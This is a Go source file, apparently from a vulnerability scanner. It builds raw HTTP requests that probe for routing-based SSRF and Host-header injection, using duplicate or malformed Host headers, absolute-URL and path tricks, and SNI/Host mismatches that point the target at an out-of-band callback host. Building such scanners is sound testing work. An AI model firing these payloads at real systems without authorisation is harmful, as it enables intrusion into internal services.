package scanner

import (
	"fmt"
	"net/url"
	"strings"

	"hidden-attack-surface-scanner/pkg/payload"
)

func BuildCrackingRequest(targetURL string, item payload.Payload, oobURL string) (RawRequest, error) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return RawRequest{}, err
	}

	host := parsed.Hostname()
	port := parsed.Port()
	useTLS := strings.EqualFold(parsed.Scheme, "https")
	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}
	path := parsed.EscapedPath()
	if path == "" {
		path = "/"
	}
	if parsed.RawQuery != "" {
		path += "?" + parsed.RawQuery
	}

	address := netJoinHostPort(host, port)
	switch item.Key {
	case "absolute-url-host-mismatch":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET https://%s%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				oobURL, path, host,
			)),
		}, nil
	case "duplicate-host":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, host, oobURL,
			)),
		}, nil
	case "host-with-at":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s@%s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, oobURL, host,
			)),
		}, nil
	case "host-at-reversed":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s@%s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, host, oobURL,
			)),
		}, nil
	case "host-with-hash":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s#%s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, host, oobURL,
			)),
		}, nil
	case "host-crlf-inject":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s\r\nX-Injected: %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, host, oobURL,
			)),
		}, nil
	case "host-with-space":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, host, oobURL,
			)),
		}, nil
	case "path-at-prefix":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET @%s%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				oobURL, path, host,
			)),
		}, nil
	case "path-slash-prefix":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET /%s%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				oobURL, path, host,
			)),
		}, nil
	case "sni-host-mismatch":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: oobURL,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, host,
			)),
		}, nil
	case "sni-host-mismatch-reversed":
		return RawRequest{
			Address: address,
			UseTLS:  useTLS,
			SNIHost: host,
			RawBytes: []byte(fmt.Sprintf(
				"GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-transform\r\n\r\n",
				path, oobURL,
			)),
		}, nil
	default:
		return RawRequest{}, fmt.Errorf("unsupported raw payload: %s", item.Key)
	}
}

func netJoinHostPort(host string, port string) string {
	if strings.Contains(host, ":") {
		return "[" + host + "]:" + port
	}
	return host + ":" + port
}
